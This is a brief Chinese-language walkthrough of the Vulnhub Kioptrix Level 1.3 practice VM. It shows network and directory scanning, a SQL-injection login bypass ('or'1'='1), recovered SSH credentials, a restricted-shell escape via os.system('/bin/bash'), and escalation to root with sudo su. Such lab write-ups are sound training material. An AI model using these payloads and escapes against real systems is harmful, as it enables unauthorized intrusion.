# Vulnhub Kioptix Level 1.3(#4)


# Vulnhub-kioptix-Level-1.3（#4）

### 基本信息

kali:192.168.110.10

靶机:192.168.110.26

### 一、信息收集

```
└─# arp-scan --interface=eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.110.1   00:50:56:a3:2e:39       VMware, Inc.
192.168.110.18  00:50:56:a3:de:c6       VMware, Inc.
192.168.110.19  00:50:56:a3:bd:59       VMware, Inc.
192.168.110.26  00:50:56:a3:2f:b8       VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.013 seconds (127.17 hosts/sec). 4 responded
```

```
GENERATED WORDS: 4612

---- Scanning URL: http://192.168.110.26/ ----
+ http://192.168.110.26/cgi-bin/ (CODE:403|SIZE:329)
==> DIRECTORY: http://192.168.110.26/images/
+ http://192.168.110.26/index (CODE:200|SIZE:1255)
+ http://192.168.110.26/index.php (CODE:200|SIZE:1255)
==> DIRECTORY: http://192.168.110.26/john/
+ http://192.168.110.26/logout (CODE:302|SIZE:0)
+ http://192.168.110.26/member (CODE:302|SIZE:220)
+ http://192.168.110.26/server-status (CODE:403|SIZE:334)

---- Entering directory: http://192.168.110.26/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.110.26/john/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

```

### 二、漏洞利用

试下万能码`'or'1'='1`

```
join
'or'1'='1
```

可以登录

ssh登录

```
Username	:	john
Password	:	MyNameIsJohn
```

```
john:~$ sudo su
*** forbidden sudo -> sudo su
john:~$ id
*** unknown command: id
```

```
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

```
john@Kioptrix4:~$ sudo su
[sudo] password for john:
root@Kioptrix4:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
```


